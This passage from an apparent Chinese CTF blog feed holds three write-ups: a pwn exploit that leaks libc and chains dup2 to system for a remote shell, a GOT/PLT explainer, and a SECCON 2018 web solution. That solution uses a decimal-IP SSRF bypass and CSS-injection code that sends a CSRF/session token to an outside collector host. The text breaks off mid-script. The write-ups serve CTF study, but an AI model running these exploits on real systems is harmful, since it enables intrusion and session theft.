class="hljs-comment"># p.recvline()</span></span><br><span class="line"><span class="hljs-comment"># payload = 'a' * 64 + p32(canary) + 'b' * 12 + p32(system_addr) + p32(system_addr) + p32(bss_addr)</span></span><br><span class="line"><span class="hljs-comment"># p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 0xf75c9c94:call   0xf763f7e0 &lt;execve&gt; </span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;<code>fuzz</code>和<code>fuzz_send_client</code>分别爆破canary cookie和程序基地址，其实他们都一种手法。<br><br>&emsp;&emsp;这里还需要特别说明的是exp在：<br><br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + p32(recv_addr) + p32(system_addr) + p32(<span class="hljs-number">4</span>) + p32(bss_addr) + p32(len(shellcode)) + p32(<span class="hljs-number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">log.debug(<span class="hljs-string">"ready to write shelloce..."</span>)</span><br><span class="line">p.sendline(shellcode)</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;就已经攻击成功，一开始我还有些疑惑，可以看到那些注释了的代码才是我原本的思路，我还需要return到system调用shellcode。<br><br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + p32(system_addr) + p32(system_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;但是事实上，在<code>recv_addr</code>执行完跳到<code>system_addr</code>的时候栈内的数据刚好满足<code>system</code>调用shellcode。而且按照原来的思路：先把shellcode写到<code>bss段</code>，然后再起一个连接执行<code>system(bss_shellcode)</code>。但在调试过程中发现，<code>bss段</code>在每个连接中都会被清<code>0</code>，并不能保存上一个进程写入的<code>shellcode</code>。<br><br>&emsp;&emsp;在<code>p.sendline(shellcode)</code>执行后的程序栈如下：<br><div align="center"><br>    <img src="/images/posts/pwn/18.png"><br></div><p>&emsp;&emsp;我单独对<code>system</code>调用写了一个简单的程序，对他调试到<code>system</code>处的情况：</p><div align="center"><br>    <img src="/images/posts/pwn/19.png"><br></div><p>&emsp;&emsp;可以看到在进入<code>system</code>时的栈情况都相同，栈顶为返回地址，接下去是参数。</p><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>&emsp;&emsp;上面之所以采用反弹的方式是因为<code>socket</code>不能作为程序的输入输出流，因为主程序运行在服务器上，所以即使你<code>/bin/sh</code>成功，你也收不到shell，只会在服务器端开启一个shell。如果我们能够重定向输入输出流到socket，那么我们就能拿到一个<code>shell</code>。</p><p>&emsp;&emsp;在Linux中有一个<code>dup2</code>的程序，其官方解释如下：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dup, dup2, dup3 - duplicate a file descriptor</span><br><span class="line"></span><br><span class="line">The dup() system call creates a copy of the file descriptor oldfd,</span><br><span class="line">using the lowest-numbered unused file descriptor for the new</span><br><span class="line">descriptor.</span><br><span class="line"></span><br><span class="line">The dup2() system call performs the same task as dup(), but instead</span><br><span class="line">of using the lowest-numbered unused file descriptor, it uses the file</span><br><span class="line">descriptor number specified in newfd.  If the file descriptor newfd</span><br><span class="line">was previously open, it is silently closed before being reused.</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;它的作用就是<code>重定向</code>一个文件描述符，Linux的理念就是一切皆文件，输入输出也一样。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0: 进程的标准输入相关联</span><br><span class="line">1: 进程的标准输出相关联</span><br><span class="line">2: 进程的标准错误输出相关联</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;而socket的文件描述符在此环境中为<code>4</code>。那么我们就可以使用：</p><ul><li>dup2(4, 0)</li><li>dup2(4, 1)</li></ul><p>&emsp;&emsp;来把输入输出定向到socket上。</p><p>&emsp;&emsp;因为dup2只对当前进程有效，不能说我先用两个连接(进程)来启动dup2，之后就直接调system。我们必须在一次连接中完成重定向输入输出和调用system。那么我们怎么构造payload呢？一般我们都是return一次，如：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 执行完recv，就跳到system，但不能再跳了</span><br><span class="line">payload = &apos;a&apos; * 64 + p32(canary) + &apos;b&apos; * 12 + p32(recv_addr) + p32(system_addr) + p32(4) + p32(bss_addr) + p32(len(shellcode)) + p32(0)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里我们使用一个<code>gadget</code>：<code>pop pop ret</code>。因为我们dup2的参数有两个，所以我们要pop两次才能维持<code>栈平衡</code>，不影响下一个调用。这里的gadget可以用<code>ROPgadget</code>查找。</p><p>&emsp;&emsp;最终的exp如下：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'i386'</span>, os = <span class="hljs-string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># ip = '192.168.210.11'</span></span><br><span class="line">ip = <span class="hljs-string">'127.0.0.1'</span></span><br><span class="line"></span><br><span class="line">canary = <span class="hljs-number">0x1b617500</span></span><br><span class="line">code_base = <span class="hljs-number">0x5655e000</span></span><br><span class="line"></span><br><span class="line">pelf = ELF(<span class="hljs-string">'./pie'</span>)</span><br><span class="line">libc = ELF(<span class="hljs-string">'./libc.so.local'</span>)</span><br><span class="line">p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">main_addr = code_base + <span class="hljs-number">0x00000F3C</span></span><br><span class="line">send_addr = code_base + <span class="hljs-number">0x00000E8C</span></span><br><span class="line">libc_start_main = code_base + pelf.got[<span class="hljs-string">"__libc_start_main"</span>]</span><br><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + p32(send_addr) + p32(main_addr) + p32(<span class="hljs-number">4</span>) + p32(libc_start_main) + p32(<span class="hljs-number">16</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_start_main = u32(p.recv()[:<span class="hljs-number">4</span>])</span><br><span class="line">p.close()</span><br><span class="line">log.debug(<span class="hljs-string">"libc_start_main: "</span> + hex(libc_start_main))</span><br><span class="line"></span><br><span class="line">libc_base_addr = libc_start_main - libc.symbols[<span class="hljs-string">"__libc_start_main"</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"libc_base_addr: "</span> + hex(libc_base_addr))</span><br><span class="line">system_addr = libc_base_addr + libc.symbols[<span class="hljs-string">"system"</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"system_addr: "</span> + hex(system_addr))</span><br><span class="line">binsh_addr = libc_base_addr + next(libc.search(<span class="hljs-string">'/bin/sh'</span>))</span><br><span class="line">log.debug(<span class="hljs-string">"binsh_addr: "</span> + hex(binsh_addr))</span><br><span class="line">dup2_adddr = libc_base_addr + libc.symbols[<span class="hljs-string">"dup2"</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"dup2_adddr: "</span> + hex(dup2_adddr))</span><br><span class="line"></span><br><span class="line">ppr_addr = code_base + <span class="hljs-number">0x0000122A</span></span><br><span class="line">log.debug(<span class="hljs-string">"use dup2 to call system sh..."</span>)</span><br><span class="line">pause()</span><br><span class="line">p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">padding = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span></span><br><span class="line">payload = padding + p32(dup2_adddr) + p32(ppr_addr) + p32(<span class="hljs-number">4</span>) + p32(<span class="hljs-number">1</span>) + p32(dup2_adddr) + p32(ppr_addr) + p32(<span class="hljs-number">4</span>) + p32(<span class="hljs-number">0</span>)</span><br><span class="line">payload += p32(system_addr) + p32(<span class="hljs-number">0</span>) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/silent123go/article/details/71108501" target="_blank" rel="noopener">https://blog.csdn.net/silent123go/article/details/71108501</a></li><li><a href="http://blog.51cto.com/duallay/1876841" target="_blank" rel="noopener">http://blog.51cto.com/duallay/1876841</a></li><li><a href="https://zoepla.github.io/2018/07/_pie_%E7%88%86%E7%A0%B4ebx+dup2/" target="_blank" rel="noopener">https://zoepla.github.io/2018/07/_pie_%E7%88%86%E7%A0%B4ebx+dup2/</a></li><li><a href="http://man7.org/linux/man-pages/man2/dup.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/dup.2.html</a></li><li><a href="https://blog.csdn.net/silent123go/article/details/71108501" target="_blank" rel="noopener">https://blog.csdn.net/silent123go/article/details/71108501</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这篇文章记录如何使用&lt;code&gt;partial overwrite&lt;/code&gt;绕过&lt;code&gt;pie&lt;/code&gt;和使用&lt;code&gt;dup2&lt;/code&gt;重定向输入输出流到&lt;code&gt;socket&lt;/code&gt;。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="bypass pie" scheme="http://yoursite.com/tags/bypass-pie/"/>
    
  </entry>
  
  <entry>
    <title>got/plt表学习</title>
    <link href="http://yoursite.com/2018/11/got-plt-study/"/>
    <id>http://yoursite.com/2018/11/got-plt-study/</id>
    <published>2018-11-21T14:47:56.000Z</published>
    <updated>2018-11-27T12:35:38.855Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;plt/got表在pwn中经常被提及与使用，这篇文章就简单讲讲plt/got表的作用及流程。<br><a id="more"></a></p><h3 id="首先为什么需要使用这门技术？"><a href="#首先为什么需要使用这门技术？" class="headerlink" title="首先为什么需要使用这门技术？"></a>首先为什么需要使用这门技术？</h3><p>&emsp;&emsp;大家都知道操作系统通常使用动态链接的方法来提高程序运行的效率。在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。这样的设计就能提高程序运行的流畅度，也减少了内存空间。</p><p>&emsp;&emsp;plt/got在其中就起到了重要作用，起到了映射作用。</p><h3 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h3><p>&emsp;&emsp;GOT（Global Offset Table）全局偏移表用于记录在 ELF 文件中所用到的共享库中符号的<code>绝对(真实)地址</code>。在程序刚开始运行时，GOT 表项是空的，当符号<code>第一次被调用时</code>会动态解析符号的绝对地址然后转去执行，并将被解析符号的绝对地址记录在 GOT 中，第二次调用同一符号时，由于 GOT 中已经记录了其绝对地址，<code>直接</code>转去执行即可（不用重新解析）。</p><h3 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h3><p>&emsp;&emsp;PLT（Procedure Linkage Table）过程链接表的作用是将位置无关的符号转移到绝对地址。当一个外部符号被调用时，PLT 去引用 GOT 中的其符号对应的绝对地址，然后转入并执行。</p><p>&emsp;&emsp;用一张图来描述就是：</p><div align="center"><br>    <img src="/images/posts/pwn/1.png"><br></div><br>&emsp;&emsp;这里可以注意一下这里的表并不意味着表里的数据就是一个（地址、指令），还可能是一串代码（function），在后面会体现出来。<br><br>### DEMO<br><br>&emsp;&emsp;这里我们通过用gdb跟踪调试一个带<code>puts</code>的程序来讲解。这段程序在<code>ida</code>中的体现如下（只针对puts）：<br><br>&emsp;&emsp;调用点：<br><div align="center"><br>    <img src="/images/posts/pwn/2.png"><br></div><br>&emsp;&emsp;plt表指向：<br><div align="center"><br>    <img src="/images/posts/pwn/3.png"><br></div><br>&emsp;&emsp;got表：<br><div align="center"><br>    <img src="/images/posts/pwn/4.png"><br></div><br>&emsp;&emsp;为了先有个整体的思路，这里先放两张图，图中的地址并不是这个demo的地址，但流程一样。<br><br>&emsp;&emsp;第一次调用时got表还没有该函数的真实地址，此时的流程是：<br><div align="center"><br>    <img src="/images/posts/pwn/6.png"><br></div><br>&emsp;&emsp;第一次调用以后got表里已经有该函数的真实地址，以后的流程是：<br><div align="center"><br>    <img src="/images/posts/pwn/5.png"><br></div><p>&emsp;&emsp;特别说明的是：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve：在函数被第一次执行时进行地址解析和重定位工作</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;打开gdb，我们在<code>call _puts</code>的前面下个断点，然后进行调试：</p><div align="center"><br>    <img src="/images/posts/pwn/7.png"><br></div><br><div align="center"><br>    <img src="/images/posts/pwn/8.png"><br></div><br><div align="center"><br>    <img src="/images/posts/pwn/9.png"><br></div><br><div align="center"><br>    <img src="/images/posts/pwn/10.png"><br></div><br>&emsp;&emsp;这里有点疑惑的地方就是我的<code>_dl_runtime_resolve</code>没有被识别出来。<br><br>&emsp;&emsp;因为疑惑，所以在后面我在可能它的地址<code>0xf7fee000</code>处下了断点，然后<code>c</code>执行。<br><br>&emsp;&emsp;在它的内部果然返回了<code>puts</code>的真实地址：<br><div align="center"><br>    <img src="/images/posts/pwn/11.png"><br></div><h3 id="第二次跟踪"><a href="#第二次跟踪" class="headerlink" title="第二次跟踪"></a>第二次跟踪</h3><p>&emsp;&emsp;这次我们直接跟<code>plt --&gt; got</code></p><p><div align="center"><br>    <img src="/images/posts/pwn/12.png"><br></div><br>&emsp;&emsp;可以看到我们在got表中<code>直接</code>取到了<code>puts</code>的真实地址<code>0xf7e6bca0</code>，这个值也跟第一次得到的一样。</p><p>&emsp;&emsp;这时，我们在回过头看上面那两张流程图就比较能理解了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://rickgray.me/2015/08/07/use-gdb-to-study-got-and-plt/" target="_blank" rel="noopener">http://rickgray.me/2015/08/07/use-gdb-to-study-got-and-plt/</a></li><li><a href="https://www.jianshu.com/p/0ac63c3744dd" target="_blank" rel="noopener">https://www.jianshu.com/p/0ac63c3744dd</a></li><li><a href="https://tinylab.gitbooks.io/cbook/zh/chapters/02-chapter4.html" target="_blank" rel="noopener">https://tinylab.gitbooks.io/cbook/zh/chapters/02-chapter4.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;emsp;&amp;emsp;plt/got表在pwn中经常被提及与使用，这篇文章就简单讲讲plt/got表的作用及流程。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SECCON 2018 GhostKingdom writeup</title>
    <link href="http://yoursite.com/2018/11/seccon2018-web-writeup/"/>
    <id>http://yoursite.com/2018/11/seccon2018-web-writeup/</id>
    <published>2018-11-01T03:47:56.000Z</published>
    <updated>2018-11-23T12:49:33.404Z</updated>
    
    <content type="html"><![CDATA[<p>赛后复现<br><a id="more"></a></p><p>&emsp;&emsp;题目给出的链接如下：</p><div align="center"><br>    <img src="/images/posts/seccon2018/1.png"><br></div><p>&emsp;&emsp;首页：</p><div align="center"><br>    <img src="/images/posts/seccon2018/2.png"><br></div><p>&emsp;&emsp;这里可以看到<code>from internet</code>，说明后面可能会用到<code>SSRF</code>，以达到<code>from localtion</code>的效果。</p><p>&emsp;&emsp;注册新用户登录进来可以看到：</p><div align="center"><br>    <img src="/images/posts/seccon2018/3.png"><br></div><ul><li><p><code>Upload image</code><br>&emsp;&emsp;上传图片的功能只能由本地网络登录使用，那么我们第一个目标就是要成为<code>本地</code>网络。</p></li><li><p><code>Message to admin</code><br>&emsp;&emsp;这里可以输入信息，然后发给admin。<br><div align="center"><br>  <img src="/images/posts/seccon2018/4.png"><br></div><br>&emsp;&emsp;<code>Normal</code>是没有<code>CSS</code>的：<br><div align="center"><br>  <img src="/images/posts/seccon2018/5.png"><br></div><br>&emsp;&emsp;而<code>Emergency</code>有CSS：<br><div align="center"><br>  <img src="/images/posts/seccon2018/6.png"><br></div><br>&emsp;&emsp;它的链接如下：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ghostkingdom.pwn.seccon.jp/?css=c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&amp;msg=aaa&amp;action=msgadm2</span><br></pre></td></tr></table></figure></li></ul><p>&emsp;&emsp;经过测试发现css的值可以被base64解密：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9</span><br><span class="line">    解密结果为：</span><br><span class="line">        span&#123;background-color:red;color:yellow&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;再对<code>msg</code>进行<code>XSS</code>测试后并没有发现安全隐患。加上<code>css</code>参数可疑，所以这里可以大胆怀疑它考的可能是<code>利用CSS来进行XSS</code>。</p><ul><li><code>Take a screenshot</code><br>&emsp;&emsp;第三个功能是对指定的地址进行访问并得到网页截图：<br><div align="center"><br>  <img src="/images/posts/seccon2018/7.png"><br></div><br>&emsp;&emsp;可以看出这里就是<code>SSRF</code>的入口。</li></ul><p>&emsp;&emsp;当我们利用这个接口访问<code>http://127.0.0.1</code>时发现：</p><div align="center"><br>    <img src="/images/posts/seccon2018/8.png"><br></div><br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can not use URLs that contain the following keywords: 127, ::1, local</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;后台做了过滤，我们可以使用<code>10进制ip</code>访问，<code>http://2130706433</code>。<br><div align="center"><br>    <img src="/images/posts/seccon2018/9.png"><br></div><br>&emsp;&emsp;可以看到我们现在的身份是<code>localtion</code>。<br><br>&emsp;&emsp;通过本地的测试我们可以知道用户登录是使用<code>GET</code>方式的：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ghostkingdom.pwn.seccon.jp/?user=200000&amp;pass=123456&amp;action=login</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;但是<code>Upload images</code>应该是<code>POST</code>请求，我们无法通过SSRF来发送一个POST包，所以我们应该要找到一些凭证，使我们可以在远程登录本地的权限。<br><br>&emsp;&emsp;在<code>send to admin</code>的页面中，可以发现一个<code>csrf input</code>：<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"msg"</span>&gt;</span>Message: aaa<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"csrf"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"6a70e8d3466ab7339dd17d"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"action"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"msgadm3"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Send to admin"</span>&gt;</span></span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;它的值跟我们的cookie是一样的：<br><div align="center"><br>    <img src="/images/posts/seccon2018/10.png"><br></div><br>&emsp;&emsp;所以我们可以尝试拿出这个cookie，然后在我们浏览器上伪造身份。而且这个cookie出现的地方就在存在<code>XSS</code>的地方。可以推测考点就在这。<br><br>&emsp;&emsp;我们可以构造一下CSS的XSS payload：<br><figure class="highlight css hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="0"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=0)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="1"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=1)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="2"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=2)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="3"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=3)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="4"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=4)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="5"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=5)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="6"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=6)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="7"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=7)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="8"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=8)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="9"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=9)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="a"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=a)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="b"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=b)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="c"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=c)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="d"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=d)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="e"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=e)&#125;</span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^="f"]</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://server?csrf=f)&#125;</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;为了简单，我这里写了一个脚本：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">real = <span class="hljs-string">'http://ghostkingdom.pwn.seccon.jp/?user=200000&amp;pass=123456&amp;action=login'</span></span><br><span class="line">login = <span class="hljs-string">'http://2130706433/?user=200000&amp;pass=123456&amp;action=login'</span></span><br><span class="line"><span class="hljs-comment"># http://ghostkingdom.pwn.seccon.jp/?action=msgadm</span></span><br><span class="line">payload = <span class="hljs-string">'input[value^="%s"] &#123;background: url(http://j1jdaj.ceye.io?csrf=%s)&#125;'</span></span><br><span class="line">url = <span class="hljs-string">'http://2130706433/?css=&#123;&#125;&amp;msg=aaa&amp;action=msgadm2'</span></span><br><span class="line">vul = <span class="hljs-string">'http://ghostkingdom.pwn.seccon.jp/?url=&#123;&#125;&amp;action=sshot2'</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">req = s.get(real)</span><br><span class="line">sleep(<span class="hljs-number">2</span>)</span><br><span class="line">s.get(vul.format(login))</span><br><span class="line">sleep(<span class="hljs-number">2</span>)</span><br><span class="line">tmp = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789abcdef'</span>:</span><br><span class="line">    temp = payload % (value, value)</span><br><span class="line">    tmp += temp + <span class="hljs-string">'\n'</span></span><br><span class="line"></span><br><span class="line">print(tmp)</span><br><span class="line">tmp = base64.b64encode(tmp.encode()).decode()</span><br><span class="line">tmp = tmp.replace(<span class="hljs-string">'='</span>, <span class="hljs-string">''</span>)</span><br><span class="line">tmp = url.format(tmp)</span><br><span class="line">print(tmp)</span><br><span class="line">t = quote(tmp, <span class="hljs-string">'utf-8'</span>)</span><br><span class="line"><span class="hljs-comment"># print(t)</span></span><br><span class="line">req = 